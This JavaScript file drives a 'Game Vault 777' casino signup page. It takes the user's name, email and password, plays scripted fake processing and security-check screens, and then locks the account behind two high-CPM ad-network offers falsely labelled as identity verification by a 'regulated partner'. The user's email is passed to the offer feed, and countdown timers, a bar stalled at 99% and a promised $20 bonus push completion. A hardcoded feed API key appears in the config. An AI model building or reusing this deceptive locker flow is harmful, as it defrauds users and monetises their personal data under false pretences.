// ══════════════════════════════════════════
// CONFIG
// ══════════════════════════════════════════
const CFG = {
  feedUrl: 'https://d1y3y09sav47f5.cloudfront.net/public/offers/feed.php?user_id=378788&api_key=01e1f87ac8720a6f0d3e8b0f1eedcf4c&s1=__UID__&s2=signup_us_uk_hicpm&callback=?',
  numOffers: 2,
  pollMs: 5000,
  pollMaxMs: 180000,
  redirectUrl: '/dashboard',
  // Injected server-side at render time:
  userId: 'USER_ID',
  sessionJwt: 'SESSION_JWT',
};

// ══════════════════════════════════════════
// STATE
// ══════════════════════════════════════════
let userData = {};
let activeIdx = null, activeUrl = null, activeWin = null;
let pollTimer = null, elTimer = null, elSecs = 0;
let verified = false, visAttached = false, lockSecs = 14 * 60 + 59;

// ══════════════════════════════════════════
// SCREEN ROUTER
// ══════════════════════════════════════════
function goTo(name) {
  const cur = document.querySelector('.screen.active');
  if (cur) { cur.classList.add('out'); setTimeout(() => cur.classList.remove('active', 'out'), 280); }
  setTimeout(() => {
    const next = g('screen-' + name);
    if (next) next.classList.add('active');
    onEnter(name);
  }, 300);
}

function onEnter(name) {
  if (name === 'processing') runProcessing();
  if (name === 'activating') runActivating();
  if (name === 'security') runSecurity();
  if (name === 'locker') initLocker();
  if (name === 'activated') runActivated();
}

// ══════════════════════════════════════════
// ① SIGNUP
// ══════════════════════════════════════════
function submitSignup() {
  const fname = g('inp-fname').value.trim(), lname = g('inp-lname').value.trim();
  const email = g('inp-email').value.trim(), pwd = g('inp-pwd').value;
  const country = g('inp-country').value, tos = g('tos-chk').classList.contains('checked');
  let ok = true;
  if (!fname) { showErr('fname', 'Required'); ok = false; } else clearErr('fname');
  if (!lname) { showErr('lname', 'Required'); ok = false; } else clearErr('lname');
  if (!email || !email.includes('@')) { showErr('email', 'Enter a valid email'); ok = false; } else clearErr('email');
  if (pwd.length < 8) { showErr('pwd', 'Min 8 characters'); ok = false; } else clearErr('pwd');
  if (!tos) { alert('Please accept the Terms of Service.'); ok = false; }
  if (!country) { alert('Please select your country.'); ok = false; }
  if (!ok) return;

  userData = { fname, lname, email, country };
  CFG.userId = email;
  g('signupBtn').disabled = true;
  g('signupBtn').innerHTML = '<i class="ph-bold ph-spinner ph-spin" style="margin-right:4px;"></i> Creating account...';
  setTimeout(() => goTo('processing'), 400);
}

function showErr(id, msg) { const i = g('inp-' + id), e = g('err-' + id); if (i) i.classList.add('err'); if (e) { e.textContent = msg; e.classList.add('show'); } }
function clearErr(id) { const i = g('inp-' + id), e = g('err-' + id); if (i) i.classList.remove('err'); if (e) e.classList.remove('show'); }
function toggleCheck(id) { const el = g(id); el.classList.toggle('checked'); el.innerHTML = el.classList.contains('checked') ? '<i class="ph-bold ph-check" style="font-size:10px;"></i>' : ''; }

g('inp-pwd').addEventListener('input', function () {
  const v = this.value, fill = g('pwd-fill'), lbl = g('pwd-lbl');
  if (!v.length) { fill.style.width = '0'; lbl.textContent = 'Enter a password'; lbl.style.color = 'var(--text-dim)'; return; }
  const s = (v.length >= 8 ? 1 : 0) + (v.length >= 12 ? 1 : 0) + (/[A-Z]/.test(v) ? 1 : 0) + (/[0-9]/.test(v) ? 1 : 0) + (/[^a-zA-Z0-9]/.test(v) ? 1 : 0);
  const i = Math.min(s, 4);
  const pcts = ['20%', '40%', '60%', '80%', '100%'], cols = ['#EF4444', '#F97316', '#EAB308', '#22C55E', '#22C55E'], labels = ['Too weak', 'Weak', 'Fair', 'Strong', 'Very strong'];
  fill.style.width = pcts[i]; fill.style.background = cols[i]; lbl.textContent = labels[i]; lbl.style.color = cols[i];
});
g('inp-email').addEventListener('blur', function () {
  const icon = g('email-icon');
  if (this.value.includes('@') && this.value.includes('.')) { this.classList.add('ok'); icon.innerHTML = '<i class="ph-bold ph-check"></i>'; icon.style.color = 'var(--green)'; icon.style.display = 'flex'; }
  else if (this.value) { this.classList.add('err'); icon.innerHTML = '<i class="ph-bold ph-x"></i>'; icon.style.color = 'var(--red)'; icon.style.display = 'flex'; }
});

// ══════════════════════════════════════════
// ② PROCESSING
// ══════════════════════════════════════════
function runProcessing() {
  const steps = ['ps1', 'ps2', 'ps3', 'ps4'], delays = [300, 800, 1400, 1900];
  delays.forEach((d, i) => {
    setTimeout(() => {
      if (i > 0) { const p = g(steps[i - 1]); p.classList.remove('active'); p.classList.add('done'); p.querySelector('.proc-dot').innerHTML = '<i class="ph-bold ph-check"></i>'; }
      g(steps[i]).classList.add('active');
    }, d);
  });
  setTimeout(() => { const p = g('ps4'); p.classList.remove('active'); p.classList.add('done'); p.querySelector('.proc-dot').innerHTML = '<i class="ph-bold ph-check"></i>'; }, 2500);
  setTimeout(() => goTo('success'), 3100);
}

// ④ ACTIVATING — bonus bar fills to 99%, pauses, then goes to security
function runActivating() {
  const items = [
    { id: 'ai1', si: 'as1', d: 350 },
    { id: 'ai2', si: 'as2', d: 850 },
    { id: 'ai3', si: 'as3', d: 1350 },
    { id: 'ai4', si: 'as4', d: 1850 },
  ];
  items.forEach(({ id, si, d }, i) => {
    setTimeout(() => { g(id).classList.add('current'); }, d);
    setTimeout(() => { g(id).classList.remove('current'); g(id).classList.add('done'); g(si).textContent = i < 3 ? '✓ Loaded' : '⏳ Pending'; }, d + 550);
  });

  const fill = g('bpcFill'), pct = g('bpcPct'), msg = g('bpcMsg');
  const msgs = ['Preparing welcome bonus...', 'Loading game library...', 'Applying VIP rewards...', 'Almost ready...'];
  let progress = 0, msgIdx = 0;
  const iv = setInterval(() => {
    if (progress >= 99) { clearInterval(iv); return; }
    const speed = progress < 80 ? 1.8 : progress < 95 ? 0.4 : 0.08;
    progress = Math.min(progress + speed, 99);
    fill.style.width = progress + '%';
    pct.textContent = Math.floor(progress) + '%';
    if (progress > msgIdx * 25 && msgIdx < msgs.length) msg.textContent = msgs[msgIdx++];
  }, 80);

  setTimeout(() => {
    msg.textContent = '⏸ Waiting for identity confirmation...';
    g('bpcPaused').classList.add('show');
    setTimeout(() => goTo('security'), 2200);
  }, 3600);
}

// ⑤ SECURITY CHECK
function runSecurity() {
  const cks = ['sc1', 'sc2', 'sc3', 'sc4'], ds = [500, 1050, 1600, 2200];
  ds.forEach((d, i) => {
    setTimeout(() => {
      if (i > 0) { const p = g(cks[i - 1]); p.classList.remove('active'); p.classList.add('done'); p.querySelector('.scdot').textContent = '✓'; }
      g(cks[i]).classList.add('active');
    }, d);
  });
  setTimeout(() => { g('sc4').classList.remove('active'); g('secAlert').classList.add('show'); }, 2900);
  setTimeout(() => goTo('locker'), 4200);
}

// ══════════════════════════════════════════
// ⑥ LOCKER INIT
// ══════════════════════════════════════════
function initLocker() {
  g('idName').textContent = userData.fname ? userData.fname + ' ' + userData.lname : 'New Player';
  g('idEmail').textContent = userData.email ? maskEmail(userData.email) : '••••@email.com';
  startLockTimer();
  fetchMethods();
}

function maskEmail(e) {
  const [u, d] = e.split('@');
  return u[0] + (u.length > 2 ? '***' : '') + '@' + d;
}

function startLockTimer() {
  const iv = setInterval(() => {
    if (--lockSecs <= 0) { clearInterval(iv); return; }
    const m = Math.floor(lockSecs / 60), s = lockSecs % 60;
    const el = g('lockTimer'); if (el) el.textContent = m + ':' + (s < 10 ? '0' : '') + s;
  }, 1000);
}

// ══════════════════════════════════════════
// OFFER FEED (JSONP)
// Top 2 = highest CPM from network
// s2 signals USA/UK geo targeting
// ══════════════════════════════════════════
const ICONS = ['<i class="ph-fill ph-bank"></i>', '<i class="ph-fill ph-clipboard-text"></i>'];
const DESCS = ['Quick identity check via trusted compliance partner', 'Secure account confirmation via regulated partner'];
const RATINGS = ['94%', '88%'];

function fetchMethods() {
  const url = CFG.feedUrl.replace('callback=?', 'callback=gv7feed').replace('__UID__', encodeURIComponent(CFG.userId));
  const tag = document.createElement('script'); let done = false;
  const to = setTimeout(() => { done = true; cleanup(); showFeedErr(); }, 9000);
  window.gv7feed = (offers) => { if (done) return; clearTimeout(to); done = true; cleanup(); renderMethods(offers); };
  tag.onerror = () => { if (done) return; clearTimeout(to); done = true; cleanup(); showFeedErr(); };
  tag.src = url; document.head.appendChild(tag);
  function cleanup() { tag.parentNode && tag.parentNode.removeChild(tag); delete window.gv7feed; }
}

function showFeedErr() {
  g('skelWrap').innerHTML = '<div style="text-align:center;padding:20px;font-size:13px;color:var(--text-sub);border:1px solid var(--border);border-radius:12px;">⚠️ Could not load verification methods. <button onclick="fetchMethods()" style="background:none;border:1px solid var(--border-med);color:var(--text-sub);padding:6px 14px;border-radius:7px;cursor:pointer;font-size:12px;margin-left:8px;font-family:Inter,sans-serif;">Retry</button></div>';
}

function renderMethods(all) {
  const offers = all.slice(0, CFG.numOffers);
  const list = g('methodList'); list.innerHTML = '';
  offers.forEach((offer, i) => {
    const c = document.createElement('div');
    c.className = 'mcard'; c.id = 'mc-' + i;
    c.innerHTML = `
      <div class="micon" id="mi-${i}">${ICONS[i]}</div>
      <div class="minfo">
        <div class="mname">${esc(offer.anchor || 'Verification Method ' + (i + 1))}</div>
        <div class="mdesc">${DESCS[i]}</div>
        <div class="cpm-row"><span class="cpm-lbl">Rating</span><div class="cpm-bar"><div class="cpm-fill" style="width:${RATINGS[i]}"></div></div><span class="cpm-val">${RATINGS[i]}</span></div>
      </div>
      <div class="mright"><span class="mtag t-free" id="mt-${i}">Free</span><div class="marrow" id="ma-${i}">›</div></div>`;
    c.addEventListener('click', () => onMethodClick(i, offer));
    list.appendChild(c);
  });
  g('skelWrap').style.display = 'none';
  list.style.display = 'flex';
}

// ══════════════════════════════════════════
// METHOD CLICK
// ══════════════════════════════════════════
function onMethodClick(idx, offer) {
  if (verified || activeIdx !== null) return;
  activeIdx = idx; activeUrl = offer.url;
  activeWin = window.open(offer.url, '_blank', 'noopener');

  // Lock the other card immediately
  document.querySelectorAll('.mcard').forEach((c, i) => {
    if (i !== idx) { c.classList.add('s-locked'); setTag(i, 'Locked', 't-locked'); }
  });

  setCardState(idx, 's-active');
  setTag(idx, 'In Progress', 't-active');
  g('ma-' + idx).textContent = '↗';

  // Show pending panel, hide activate button
  g('pendPanel').classList.add('show');
  g('actBtn').style.display = 'none';

  startElapsed();
  startPolling();
  attachVis();
}

// ══════════════════════════════════════════
// VISIBILITY DETECTION
// This is the STRICT enforcement:
// If user returns to tab without postback → show BLOCK panel, not a warning
// ══════════════════════════════════════════
function attachVis() {
  if (visAttached) return; visAttached = true;

  const check = () => {
    // Tab came back into focus without verification completing
    if (!document.hidden && !verified && activeIdx !== null) {
      setTimeout(() => {
        if (!verified) onReturnedEarly();
      }, 800);
    }
  };
  document.addEventListener('visibilitychange', check);
  window.addEventListener('focus', check);
}

function onReturnedEarly() {
  // Hide pending panel, show strict block panel
  g('pendPanel').classList.remove('show');
  g('blockPanel').classList.add('show');
  g('actBtn').style.display = 'none';

  // Shake the block panel for attention
  const bp = g('blockPanel');
  bp.style.animation = 'none';
  setTimeout(() => { bp.style.animation = 'shake 0.5s ease'; }, 50);
}

function reopenMethod() {
  if (!activeUrl) return;
  // Re-open the offer tab
  if (activeWin && !activeWin.closed) activeWin.focus();
  else activeWin = window.open(activeUrl, '_blank', 'noopener');
  // Hide block, show pending again
  g('blockPanel').classList.remove('show');
  g('pendPanel').classList.add('show');
}

function tryOtherOffer() {
  // Reset everything — let them pick a different method
  clearInterval(pollTimer); stopElapsed();
  g('blockPanel').classList.remove('show');
  g('pendPanel').classList.remove('show');

  // Unlock all cards
  document.querySelectorAll('.mcard').forEach(c => c.classList.remove('s-locked', 's-active', 's-verified'));
  for (let i = 0; i < CFG.numOffers; i++) { setTag(i, 'Free', 't-free'); if (g('ma-' + i)) g('ma-' + i).textContent = '›'; }

  activeIdx = null; activeUrl = null; activeWin = null;
  elSecs = 0; visAttached = false;
  g('actBtn').style.display = 'block';
}

// ══════════════════════════════════════════
// POLLING — ONLY unlocks when postback confirmed
// Ad network fires:
// GET /api/webhooks/offers/postback?s1={USER_ID}&secret={SECRET}&offer_id={ID}&payout={PAYOUT}
// Backend sets Redis: locker:pending:{userId} = true
// This polls: GET /api/locker/status → {completed: boolean}
// ══════════════════════════════════════════
function startPolling() {
  let elapsed = 0;
  pollTimer = setInterval(async () => {
    elapsed += CFG.pollMs;
    if (elapsed >= CFG.pollMaxMs) { clearInterval(pollTimer); onPollTimeout(); return; }
    try {
      const r = await checkStatus();
      if (r.completed) { clearInterval(pollTimer); onVerified(); }
    } catch (e) { }
  }, CFG.pollMs);
}

async function checkStatus() {
  // ── PRODUCTION ─────────────────────────────────────────────────
  try {
    const res = await fetch('/api/locker/status?email=' + encodeURIComponent(CFG.userId), {
      headers: { 'Authorization': 'Bearer ' + CFG.sessionJwt }
    });
    if (!res.ok) throw new Error('poll failed');
    return await res.json(); // Expected to return { completed: true } when done
  } catch (e) {
    // Return false on error so polling continues without unlocking
    return { completed: false };
  }
  // ───────────────────────────────────────────────────────────────
}

function onPollTimeout() {
  stopElapsed();
  g('pendPanel').classList.remove('show');
  g('blockPanel').classList.add('show');
  g('blockPanel').querySelector('.block-title').textContent = 'Verification Timed Out';
  g('blockPanel').querySelector('.block-msg').innerHTML = 'We didn\'t receive confirmation within the allowed time. Please <strong>try again</strong> or choose a different verification method.';
  g('actBtn').style.display = 'block';
}

// ══════════════════════════════════════════
// VERIFIED — postback received, unlock everything
// ══════════════════════════════════════════
function onVerified() {
  verified = true; stopElapsed();

  // Dismiss block/pending panels
  g('blockPanel').classList.remove('show');
  g('pendPanel').classList.remove('show');

  // Update card to verified
  setCardState(activeIdx, 's-verified');
  setTag(activeIdx, 'Verified ✓', 't-verified');
  g('mi-' + activeIdx).innerHTML = '<i class="ph-bold ph-check"></i>';
  g('ma-' + activeIdx).innerHTML = '<i class="ph-bold ph-check"></i>';

  // Update identity card
  g('idBadge').innerHTML = '<i class="ph-bold ph-check" style="margin-right:2px;"></i> Verified';
  g('idBadge').className = 'id-badge verified';
  g('idChkVal').innerHTML = '<i class="ph-bold ph-check"></i> Confirmed';
  g('idChkVal').className = 'id-cv cv-ok';

  // Update checklist
  g('pck3').classList.add('done');
  g('pck3').querySelector('.pck-dot').style.background = 'var(--green)';

  // Activate button
  const btn = g('actBtn');
  btn.style.display = 'block';
  btn.classList.add('ready');
  btn.disabled = false;
  btn.innerHTML = '<i class="ph-bold ph-check" style="margin-right:4px;"></i> Claim $20 Bonus & Activate Account';
  btn.onclick = doActivate;

  g('actHint').textContent = 'Identity confirmed — tap to enter Game Vault 777!';
  g('actHint').className = 'act-hint ok';

  // Show a brief success pending panel state before button
  g('pendPanel').classList.add('show');
  g('pendTitle').innerHTML = '<i class="ph-bold ph-check-circle" style="color:var(--green);margin-right:4px;"></i> Identity Confirmed!';
  g('pendSub').textContent = 'Your identity has been verified. Tap the button below to claim your bonus!';
  g('pdots') && (g('pdots').style.display = 'none');
  g('elFill').style.background = 'linear-gradient(90deg,var(--green),rgba(34,197,94,0.4))';
  g('elFill').style.width = '100%';
}

// ══════════════════════════════════════════
// ACTIVATE — finalize on server, go to activated screen
// ══════════════════════════════════════════
async function doActivate() {
  if (!verified) return;

  // ── PRODUCTION ─────────────────────────────────────────────────
  // await fetch('/api/locker/complete', {
  //   method: 'POST',
  //   headers: { 'Authorization': 'Bearer ' + CFG.sessionJwt, 'Content-Type': 'application/json' },
  //   body: JSON.stringify({ source: 'signup' })
  // });
  // Server should also trigger welcome email at this point
  // ───────────────────────────────────────────────────────────────

  goTo('activated');
}

// ══════════════════════════════════════════
// ⑦ ACTIVATED SCREEN
// ══════════════════════════════════════════
function runActivated() {
  // Populate user info
  const fullName = userData.fname ? userData.fname + ' ' + userData.lname : 'New Player';
  const email = userData.email || 'player@gamevault777.com';
  const country = COUNTRY_NAMES[userData.country] || userData.country || 'United States';
  const today = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });

  g('uicName').textContent = fullName;
  g('uicEmail').textContent = email;
  g('memberSince').textContent = today;
  g('uicRegion').textContent = country;
  g('activatedSub').textContent = `Welcome, ${userData.fname || 'Player'}! Your identity is confirmed and your $20 bonus is ready.`;
  g('escEmail').textContent = `Account details sent to ${email}`;

  // Confetti
  spawnConfetti();

  // Auto-redirect countdown (10 seconds)
  let count = 10;
  const iv = setInterval(() => {
    count--;
    const el = g('redirCount'); if (el) el.textContent = count;
    const fill = g('redirFill'); if (fill) fill.style.width = ((10 - count) / 10 * 100) + '%';
    if (count <= 0) { clearInterval(iv); enterVault(); }
  }, 1000);
}

function enterVault() {
  window.location.href = CFG.redirectUrl;
}

// Country display names
const COUNTRY_NAMES = {
  US: 'United States', GB: 'United Kingdom', CA: 'Canada',
  AU: 'Australia', NZ: 'New Zealand', IE: 'Ireland', other: 'International'
};

// ══════════════════════════════════════════
// ELAPSED TIMER
// ══════════════════════════════════════════
function startElapsed() {
  elSecs = 0;
  elTimer = setInterval(() => {
    elSecs++;
    g('elTxt').textContent = elSecs + 's';
    g('elFill').style.width = Math.min((elSecs / (CFG.pollMaxMs / 1000)) * 100, 100) + '%';
  }, 1000);
}
function stopElapsed() { clearInterval(elTimer); }

// ══════════════════════════════════════════
// CONFETTI
// ══════════════════════════════════════════
function spawnConfetti() {
  const c = g('confettiEl');
  const cols = ['#F5B800', '#D97706', '#FDE68A', '#22C55E', '#60A5FA', '#ffffff'];
  for (let i = 0; i < 100; i++) {
    setTimeout(() => {
      const p = document.createElement('div'); p.className = 'cp';
      const sz = Math.random() * 8 + 4;
      p.style.cssText = `left:${Math.random() * 100}%;top:-10px;background:${cols[Math.random() * cols.length | 0]};width:${sz}px;height:${sz}px;border-radius:${Math.random() > .5 ? '50%' : '2px'};animation-duration:${Math.random() * 2 + 2.5}s;animation-delay:${Math.random() * 0.5}s;`;
      c.appendChild(p); setTimeout(() => p.remove(), 5500);
    }, i * 25);
  }
}

// ══════════════════════════════════════════
// HELPERS
// ══════════════════════════════════════════
function setCardState(idx, cls) {
  const c = g('mc-' + idx); if (!c) return;
  c.classList.remove('s-active', 's-verified', 's-locked'); c.classList.add(cls);
}
function setTag(idx, label, cls) {
  const t = g('mt-' + idx); if (!t) return;
  t.textContent = label; t.className = 'mtag ' + cls;
}
function g(id) { return document.getElementById(id); }
function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
function toggleFaq() { g('faqBtn').classList.toggle('open'); g('faqBody').classList.toggle('open'); }